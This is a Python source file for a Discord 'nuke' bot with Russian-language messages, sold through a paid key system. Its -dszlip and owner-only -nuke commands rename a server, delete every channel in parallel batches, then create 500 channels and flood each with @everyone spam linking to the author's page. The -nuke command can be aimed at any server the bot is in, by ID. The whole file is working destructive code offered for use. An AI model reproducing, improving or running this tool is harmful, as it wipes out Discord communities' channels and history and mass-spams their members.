import discord
from discord.ext import commands
import asyncio
import time
import os
import json

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all())

OWNER_ID = 1448196738308509739
keys_db = "keys.json"

def load_keys():
    try:
        with open(keys_db, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(keys_db, "w") as f:
        json.dump(keys, f)

keys_data = load_keys()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def has_key(user_id):
    return str(user_id) in keys_data

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')
    await bot.change_presence(activity=discord.Game(name="-dszlip"))

@bot.command()
async def dszlip(ctx):
    if not has_key(ctx.author.id) and not is_owner(ctx):
        await ctx.send("❌ Купи ключ у владельца")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return
    
    await ctx.send("**ZLIP EBET**")
    
    guild = ctx.guild
    start_time = time.time()
    
    # Меняем название
    try:
        await guild.edit(name="MOGGED BY ZLIP")
    except:
        pass
    
    # УДАЛЯЕМ ВСЕ КАНАЛЫ МАКСИМАЛЬНО БЫСТРО (ПАЧКАМИ ПО 200)
    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
    
    channels = list(guild.channels)
    total = len(channels)
    deleted = 0
    
    async def delete_channel(ch):
        try:
            await ch.delete()
            return True
        except:
            return False
    
    batch_size = 200
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        results = await asyncio.gather(*[delete_channel(ch) for ch in batch], return_exceptions=True)
        deleted += sum(1 for r in results if r is True)
    
    print(f"✅ Удалено {deleted} каналов")
    
    # СОЗДАЕМ 500 КАНАЛОВ ПАРАЛЛЕЛЬНО
    print("🔥 СОЗДАНИЕ 500 КАНАЛОВ...")
    
    SPAM_TEXT = """@everyone
**MOGGED BY ZLIP**
https://guns.lol/dszlip
ВЫ УПАЛИ НА КОЛЕНИ"""
    
    created = 0
    target = 500
    
    async def create_and_spam(i):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            return True
        except:
            return False
    
    batch_size = 50  # 50 каналов ОДНОВРЕМЕННО
    for i in range(0, target, batch_size):
        batch = [create_and_spam(j) for j in range(i, min(i+batch_size, target))]
        results = await asyncio.gather(*batch)
        created += sum(results)
    
    elapsed = round(time.time() - start_time, 1)
    print(f"✅ Создано {created} каналов за {elapsed}с")
    
    await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nВремя: {elapsed}с")

@bot.command()
async def key(ctx):
    await ctx.send("🔑 Купи ключ у владельца @dszlip\nИспользуй `-activate КЛЮЧ`")

@bot.command()
async def activate(ctx, *, key: str = None):
    if not key:
        await ctx.send("❌ Использование: `-activate КЛЮЧ`")
        return
    
    if key in keys_data.values():
        await ctx.send("❌ Этот ключ уже использован")
        return
    
    if len(key) >= 8:
        keys_data[str(ctx.author.id)] = key
        save_keys(keys_data)
        await ctx.send("✅ Ключ активирован! Используй `-dszlip`")
    else:
        await ctx.send("❌ Неверный ключ")

@bot.command()
async def nuke(ctx, guild_id: int = None):
    if not is_owner(ctx):
        return
    
    if not guild_id:
        await ctx.send("❌ Использование: `-nuke ID_СЕРВЕРА`")
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"❌ Сервер с ID `{guild_id}` не найден")
        return
    
    await ctx.send(f"🔥 НЮК СЕРВЕРА: **{guild.name}**")
    
    try:
        await guild.edit(name="MOGGED BY ZLIP")
    except:
        pass
    
    channels = list(guild.channels)
    async def delete_ch(ch):
        try:
            await ch.delete()
            return True
        except:
            return False
    
    batch_size = 200
    for i in range(0, len(channels), batch_size):
        batch = channels[i:i+batch_size]
        await asyncio.gather(*[delete_ch(ch) for ch in batch], return_exceptions=True)
    
    SPAM = "@everyone\nMOGGED BY ZLIP\nhttps://guns.lol/dszlip"
    
    created = 0
    async def create(ch):
        try:
            c = await guild.create_text_channel(f"zlip-{ch+1}")
            await asyncio.gather(*[c.send(SPAM) for _ in range(5)])
            return True
        except:
            return False
    
    batch_size = 50
    for i in range(0, 500, batch_size):
        batch = [create(j) for j in range(i, min(i+batch_size, 500))]
        results = await asyncio.gather(*batch)
        created += sum(results)
    
    await ctx.send(f"✅ **{guild.name}** уничтожен\nСоздано: {created} каналов")

@bot.command()
async def servers(ctx):
    if not is_owner(ctx):
        return
    
    msg = ""
    for g in bot.guilds:
        msg += f"**{g.name}** | ID: `{g.id}` | {g.member_count} участников\n"
    
    await ctx.send(f"📊 СЕРВЕРЫ:\n{msg}")

@bot.command()
async def genkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        return
    
    if not user:
        await ctx.send("❌ Использование: `-genkey @пользователь`")
        return
    
    key = f"ZLIP-{int(time.time())}-{user.id}"[:16]
    keys_data[str(user.id)] = key
    save_keys(keys_data)
    
    await ctx.send(f"✅ Ключ выдан: {user.mention}\nКлюч: `{key}`")
    
    try:
        await user.send(f"🔑 Твой ключ: `{key}`\nИспользуй `-activate {key}`")
    except:
        pass

@bot.command()
async def delkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        return
    
    if not user:
        await ctx.send("❌ Использование: `-delkey @пользователь`")
        return
    
    if str(user.id) in keys_data:
        del keys_data[str(user.id)]
        save_keys(keys_data)
        await ctx.send(f"✅ Ключ удалён у {user.mention}")
    else:
        await ctx.send(f"❌ У {user.mention} нет ключа")

@bot.command()
async def keys(ctx):
    if not is_owner(ctx):
        return
    
    msg = ""
    for uid, key in keys_data.items():
        try:
            user = await bot.fetch_user(int(uid))
            msg += f"{user.name}: `{key}`\n"
        except:
            msg += f"`{uid}`: `{key}`\n"
    
    await ctx.send(f"🔑 АКТИВНЫЕ КЛЮЧИ:\n{msg}")

import os
bot.run(os.environ['TOKEN'])
